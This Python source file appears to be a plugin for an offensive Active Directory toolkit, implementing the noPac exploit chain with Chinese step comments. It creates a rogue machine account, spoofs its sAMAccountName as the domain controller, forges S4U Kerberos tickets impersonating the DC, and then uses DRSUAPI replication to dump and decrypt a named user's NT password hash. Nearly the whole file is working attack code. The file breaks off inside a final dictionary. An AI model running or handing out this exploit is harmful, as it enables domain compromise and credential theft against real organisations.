import argparse
import datetime
import os
import random
import string
import struct
from binascii import hexlify
from binascii import unhexlify
from copy import copy
from struct import unpack

import ldap3
from impacket import ntlm
from impacket.dcerpc.v5 import epm, drsuapi, transport, rpcrt
from impacket.dcerpc.v5 import samr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
from impacket.krb5.ccache import CCache
from impacket.krb5.constants import TicketFlags
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.ntlm import compute_nthash
from impacket.uuid import string_to_bin
from impacket.winregistry import hexdump
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from six import b

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADNoPacHash(PluginAdExploitBase):
    display = "noPac hashdump"
    alias = "nopac_hash"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display
        parser.add_argument("-u", "--username", required=True, dest="username")
        parser.add_argument("-p", "--password", required=True, dest="password")
        parser.add_argument("--dc-ip", required=True, dest="dc_ip")
        parser.add_argument("-n", "--name", required=True, help="dump user hash", dest="dump_user")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        username = args.username
        password = args.password
        dc_ip = args.dc_ip
        name = args.dump_user

        computer_name = 'DESKTOP-' + (
                ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')

        stringBinding = epm.hept_map(dc_ip, samr.MSRPC_UUID_SAMR, protocol='ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_credentials(username, password)
        rpc_samr = rpctransport.get_dce_rpc()
        rpc_samr.set_auth_level(6)
        rpc_samr.connect()
        resp = rpc_samr.bind(samr.MSRPC_UUID_SAMR)

        # 获取域名和 DC机器名
        chl = ntlm.NTLMAuthChallenge(resp['auth_data'])
        avparis = ntlm.AV_PAIRS(chl['TargetInfoFields'])
        NBT_DC_HOSTNAME = avparis[ntlm.NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
        DNS_DC_HOSTNAME = avparis[ntlm.NTLMSSP_AV_DNS_HOSTNAME][1].decode('utf-16le')
        DNS_DOMAIN_NAME = avparis[ntlm.NTLMSSP_AV_DNS_DOMAINNAME][1].decode('utf-16le')

        output.info(f'dc hostname: {NBT_DC_HOSTNAME},dns domain name: {DNS_DOMAIN_NAME}')

        # 2. samr 创建计算机账户 走135和动态端口

        samrConnectResponse = samr.hSamrConnect5(rpc_samr, '\\\\%s\x00' % dc_ip,
                                                 samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
        servHandle = samrConnectResponse['ServerHandle']
        selectedDomain = DNS_DOMAIN_NAME.split('.')[0].upper()
        samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(rpc_samr, servHandle, selectedDomain)
        domainSID = samrLookupDomainResponse['DomainId']
        samrOpenDomainResponse = samr.hSamrOpenDomain(rpc_samr, servHandle,
                                                      samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, domainSID)
        domainHandle = samrOpenDomainResponse['DomainHandle']

        # 检查计算机是否存在
        try:
            checkForUser = samr.hSamrLookupNamesInDomain(rpc_samr, domainHandle, [computer_name])
            output.error(f'computer account alredy exists, run again')
            return result
        except samr.DCERPCSessionError as e:
            if e.error_code == 0xc0000073:
                output.success("Account %s not found in domain %s, go ahead!" % (computer_name, selectedDomain))
            else:
                raise

        # samr 创建计算机账户
        try:
            createUser = samr.hSamrCreateUser2InDomain(rpc_samr, domainHandle, computer_name,
                                                       samr.USER_WORKSTATION_TRUST_ACCOUNT,
                                                       samr.USER_FORCE_PASSWORD_CHANGE, )
            output.success(f'computer account {computer_name} create succss!!')
        except samr.DCERPCSessionError as e:
            if e.error_code == 0xc0000022:
                raise Exception("User %s doesn't have right to create a machine account!" % username)
            elif e.error_code == 0xc00002e7:
                raise Exception("User %s machine quota exceeded!" % username)
            else:
                raise

        userHandle = createUser['UserHandle']

        # samr 设置计算机密码（不设置应该也可以）
        computer_pass = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

        try:
            samr.hSamrChangePasswordUser(rpc_samr, userHandle, oldPassword='', newPassword=computer_pass)
            # 防止账户禁用
            checkForUser = samr.hSamrLookupNamesInDomain(rpc_samr, domainHandle, [computer_name])
            userRID = checkForUser['RelativeIds']['Element'][0]
            openUser = samr.hSamrOpenUser(rpc_samr, domainHandle, samr.MAXIMUM_ALLOWED, userRID)
            userHandle = openUser['UserHandle']
            req = samr.SAMPR_USER_INFO_BUFFER()
            req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
            req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
            samr.hSamrSetInformationUser2(rpc_samr, userHandle, req)
            output.success(f'set password success {computer_pass}')
        except Exception as e:
            e.with_traceback()

        # 2. ldap 将创建的计算机samAccountName属性修改成DC的netbios hostname
        # nopac 修复之后修改samaccountName只能以$结尾 不然会报错

        ldap_session = ldap3.Connection(server=dc_ip, user=f'{DNS_DOMAIN_NAME}\\{username}', password=password,
                                        authentication=ldap3.NTLM, auto_bind=True)
        computer_dn = ','.join(
            [f'CN={computer_name[:-1]}', 'CN=Computers'] + [f'DC={d}' for d in DNS_DOMAIN_NAME.split('.')])
        ldap_session.modify(computer_dn, {
            'sAMAccountName': [ldap3.MODIFY_REPLACE, [NBT_DC_HOSTNAME]]
        })

        if ldap_session.result['result'] != 0:
            output.error(f'modify samAccountName error.', ldap_session.result)
            return result
        output.success(f'set samaccountname to {NBT_DC_HOSTNAME}')

        # 4. kerberos 申请tgt from getST.py, 捕获这里产生的异常，防止后面samaccountName重复导致无法再次攻击
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5.types import Principal, constants
            client_name = Principal(NBT_DC_HOSTNAME, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(client_name, computer_pass, DNS_DOMAIN_NAME,
                                                                    lmhash='', nthash='', kdcHost=dc_ip)
        except Exception as e:
            pass
        finally:
            # 5. ldap 恢复机器名
            ldap_session.modify(computer_dn, {
                'sAMAccountName': [ldap3.MODIFY_REPLACE, [computer_name[:-1]]]
            })

            if ldap_session.result['result'] != 0:
                output.error(f'modify samAccountName error.', ldap_session.result)
                return result
            output.success(f'reset sAMAccountName to {computer_name[:-1]}')

        # 6. kerberos 申请ST s4U from getST.py
        opts = argparse.Namespace()
        setattr(opts, "spn", f'cifs/{DNS_DC_HOSTNAME}')
        setattr(opts, "impersonate", f'{NBT_DC_HOSTNAME}$')
        setattr(opts, "dc_ip", dc_ip)
        setattr(opts, "hashes", None)
        setattr(opts, "additional_ticket", None)
        setattr(opts, "aesKey", "")

        executer = GETST(None, None, DNS_DOMAIN_NAME, opts)

        tgs, cipher, oldSessionKey, sessionKey = executer.doS4U(tgt, cipher, oldSessionKey, sessionKey, '', '', dc_ip)

        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())

        c = CCache()
        c.fromTGS(tgs, oldSessionKey, sessionKey)
        # c.prettyPrint()
        t = c.credentials[0].toTGS()

        # bind
        stringBinding = epm.hept_map(dc_ip, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
        # stringBinding = stringBinding.replace(dc_ip, DNS_DC_HOSTNAME)
        rpc = transport.DCERPCTransportFactory(stringBinding)
        rpc.set_kerberos(True, dc_ip)
        # decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        rpc.set_credentials(opts.impersonate, '', TGS=t, domain=DNS_DOMAIN_NAME)
        drsr = rpc.get_dce_rpc()
        drsr.set_auth_level(6)
        drsr.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
        drsr.connect()
        b = drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        # request
        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs)  # - 4
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        # I'm uber potential (c) Ben
        drs['dwExtCaps'] = 0xffffffff
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(drs.getData())
        resp = drsr.request(request)

        # resp.dump()

        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
                len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = drsr.request(request)

        hDrs = resp['phDrs']

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(drsr, hDrs, DNS_DOMAIN_NAME, 2)

        if resp['pmsgOut']['V2']['cItems'] > 0:
            ntdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            raise Exception('Fatal, aborting')

        # hDRSCrackNames

        crackedName = drsuapi.hDRSCrackNames(drsr, hDrs, 0, drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN,
                                             drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, (name,))

        userEntry = crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1]
        # DRSGetNCChanges
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = ntdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = ntdsDsaObjectGuid

        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin(userEntry[1:-1])
        dsName['Sid'] = ''
        dsName['NameLen'] = 0
        dsName['StringName'] = ('\x00')

        dsName['structLen'] = len(dsName.getData())

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ

        prefixTable = []
        ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
        ppartialAttrSet['dwVersion'] = 1
        ppartialAttrSet['cAttrs'] = len(ATTRTYP_TO_ATTID)
        for attId in list(ATTRTYP_TO_ATTID.values()):
            ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(prefixTable, attId))
        request['pmsgIn']['V8']['pPartialAttrSet'] = ppartialAttrSet
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

        userRecord = drsr.request(request)
        replyVersion = 'V%d' % userRecord['pdwOutVersion']
        rid = unpack('<L', userRecord['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]

        output.info("dump hash")

        for attr in userRecord['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
            attId = drsuapi.OidFromAttid(userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
                                         attr['attrTyp'])
            if attId == ATTRTYP_TO_ATTID['unicodePwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedNTHash = drsuapi.DecryptAttributeValue(drsr, encryptedUnicodePwd)
                    NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                else:
                    NTHash = ntlm.NTOWFv1('', '')

                output.success(f'{name} : {NTHash.hex()}')
                break

        return result


class GETST:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__user = target
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__options = options
        self.__kdcHost = options.dc_ip
        self.__additional_ticket = options.additional_ticket
        self.__saveFileName = '1'
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def saveTicket(self, ticket, sessionKey):
        output.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
        ccache = CCache()

        ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__saveFileName + '.ccache')

    def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost,
                                        additional_ticket_path):
        if not os.path.isfile(additional_ticket_path):
            output.error("Ticket %s doesn't exist" % additional_ticket_path)
            exit(0)
        else:
            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            output.info("\tUsing additional ticket %s instead of S4U2Self" % additional_ticket_path)
            ccache = CCache.loadFile(additional_ticket_path)
            principal = ccache.credentials[0].header['server'].prettyPrint()
            creds = ccache.getCredential(principal.decode())
            TGS = creds.toTGS(principal)

            tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]

            if self.__force_forwardable:
                # Convert hashes to binary form, just in case we're receiving strings
                if isinstance(nthash, str):
                    try:
                        nthash = unhexlify(nthash)
                    except TypeError:
                        pass
                if isinstance(aesKey, str):
                    try:
                        aesKey = unhexlify(aesKey)
                    except TypeError:
                        pass

                # Compute NTHash and AESKey if they're not provided in arguments
                if self.__password != '' and self.__domain != '' and self.__user != '':
                    if not nthash:
                        nthash = compute_nthash(self.__password)
                    if not aesKey:
                        salt = self.__domain.upper() + self.__user
                        aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents

                # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
                cipherText = tgs['ticket']['enc-part']['cipher']

                # Check which cipher was used to encrypt the ticket. It's not always the same
                # This determines which of our keys we should use for decryption/re-encryption
                newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
                if newCipher.enctype == Enctype.RC4:
                    key = Key(newCipher.enctype, nthash)
                else:
                    key = Key(newCipher.enctype, aesKey)

                # Decrypt and decode the ticket
                # Key Usage 2
                # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
                #  application session key), encrypted with the service key
                #  (section 5.4.2)
                plainText = newCipher.decrypt(key, 2, cipherText)
                encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

                # Print the flags in the ticket before modification
                output.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
                output.debug('\tService ticket from S4U2self is'
                             + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                             + ' forwardable')

                # Customize flags the forwardable flag is the only one that really matters
                output.info('\tForcing the service ticket to be forwardable')
                # convert to string of bits
                flagBits = encTicketPart['flags'].asBinary()
                # Set the forwardable flag. Awkward binary string insertion
                flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
                # Overwrite the value with the new bits
                encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

                output.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
                output.debug('\tService ticket now is'
                             + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                             + ' forwardable')

                # Re-encode and re-encrypt the ticket
                # Again, Key Usage 2
                encodedEncTicketPart = encoder.encode(encTicketPart)
                cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

                # put it back in the TGS
                tgs['ticket']['enc-part']['cipher'] = cipherText

            ################################################################################
            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
            # So here I have a ST for me.. I now want a ST for another service
            # Extract the ticket from the TGT
            ticketTGT = Ticket()
            ticketTGT.from_asn1(decodedTGT['ticket'])

            # Get the service ticket
            ticket = Ticket()
            ticket.from_asn1(tgs['ticket'])

            apReq = AP_REQ()
            apReq['pvno'] = 5
            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = list()
            apReq['ap-options'] = constants.encodeFlags(opts)
            seq_set(apReq, 'ticket', ticketTGT.to_asn1)

            authenticator = Authenticator()
            authenticator['authenticator-vno'] = 5
            authenticator['crealm'] = str(decodedTGT['crealm'])

            clientName = Principal()
            clientName.from_asn1(decodedTGT, 'crealm', 'cname')

            seq_set(authenticator, 'cname', clientName.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator['cusec'] = now.microsecond
            authenticator['ctime'] = KerberosTime.to_asn1(now)

            encodedAuthenticator = encoder.encode(authenticator)

            # Key Usage 7
            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
            # TGS authenticator subkey), encrypted with the TGS session
            # key (Section 5.5.1)
            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

            apReq['authenticator'] = noValue
            apReq['authenticator']['etype'] = cipher.enctype
            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

            encodedApReq = encoder.encode(apReq)

            tgsReq = TGS_REQ()

            tgsReq['pvno'] = 5
            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
            tgsReq['padata'] = noValue
            tgsReq['padata'][0] = noValue
            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
            tgsReq['padata'][0]['padata-value'] = encodedApReq

            # Add resource-based constrained delegation support
            paPacOptions = PA_PAC_OPTIONS()
            paPacOptions['flags'] = constants.encodeFlags(
                (constants.PAPacOptions.resource_based_constrained_delegation.value,))

            tgsReq['padata'][1] = noValue
            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

            reqBody = seq_set(tgsReq, 'req-body')

            opts = list()
            # This specified we're doing S4U
            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)

            reqBody['kdc-options'] = constants.encodeFlags(opts)
            service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            seq_set(reqBody, 'sname', service2.components_to_asn1)
            reqBody['realm'] = self.__domain

            myTicket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            reqBody['till'] = KerberosTime.to_asn1(now)
            reqBody['nonce'] = random.getrandbits(31)
            seq_set_iter(reqBody, 'etype',
                         (
                             int(constants.EncryptionTypes.rc4_hmac.value),
                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                             int(constants.EncryptionTypes.des_cbc_md5.value),
                             int(cipher.enctype)
                         )
                         )
            message = encoder.encode(tgsReq)

            output.info('\tRequesting S4U2Proxy')
            r = sendReceive(message, self.__domain, kdcHost)

            tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

            cipherText = tgs['enc-part']['cipher']

            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key (Section 5.4.2)
            plainText = cipher.decrypt(sessionKey, 8, cipherText)

            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

            # Creating new cipher based on received keytype
            cipher = _enctype_table[encTGSRepPart['key']['keytype']]

            return r, cipher, sessionKey, newSessionKey

    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.__domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        output.info('\tRequesting S4U2self')
        message = encoder.encode(tgsReq)

        r = sendReceive(message, self.__domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        cipherText = tgs['enc-part']['cipher']
        plainText = cipher.decrypt(sessionKey, 8, cipherText)
        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
        # Creating new cipher based on received keytype
        cipher = _enctype_table[encTGSRepPart['key']['keytype']]
        return r, cipher, sessionKey, newSessionKey
        ################################################################################
        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
        # So here I have a ST for me.. I now want a ST for another service
        # Extract the ticket from the TGT
        ticketTGT = Ticket()
        ticketTGT.from_asn1(decodedTGT['ticket'])

        # Get the service ticket
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticketTGT.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation support
        paPacOptions = PA_PAC_OPTIONS()
        paPacOptions['flags'] = constants.encodeFlags(
            (constants.PAPacOptions.resource_based_constrained_delegation.value,))

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = self.__domain

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                         int(constants.EncryptionTypes.des_cbc_md5.value),
                         int(cipher.enctype)
                     )
                     )
        message = encoder.encode(tgsReq)

        output.info('\tRequesting S4U2Proxy')
        r = sendReceive(message, self.__domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        cipherText = tgs['enc-part']['cipher']

        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, cipherText)

        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

        # Creating new cipher based on received keytype
        cipher = _enctype_table[encTGSRepPart['key']['keytype']]

        return r, cipher, sessionKey, newSessionKey


ATTRTYP_TO_ATTID = {
